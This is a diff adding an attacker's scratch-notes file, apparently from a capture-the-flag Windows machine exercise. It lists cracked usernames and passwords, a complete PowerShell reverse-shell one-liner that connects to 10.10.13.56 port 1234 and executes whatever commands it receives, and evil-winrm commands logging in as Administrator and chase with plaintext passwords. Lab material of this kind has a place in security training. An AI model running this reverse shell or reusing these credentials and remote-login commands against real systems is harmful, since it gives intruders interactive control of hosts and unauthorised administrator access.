@@ -1,0 +1,12 @@
+rout3r:$uperP@ssword
+admin:Q4)sJu\Y8qz*A3?d
+?:stealth1agent
+jason
+chase
+
+$client = New-Object System.Net.Sockets.TCPClient("10.10.13.56",1234);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + "PS " + (pwd).Path + "> ";$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()
+
+ruby evil-winrm.rb -i 10.10.10.149 -u Administrator -p '4dD!5}x/re8]FBuZ'
+ruby evil-winrm.rb -i 10.10.10.149 -u chase -p 'Q4)sJu\Y8qz*A3?d'
+
+
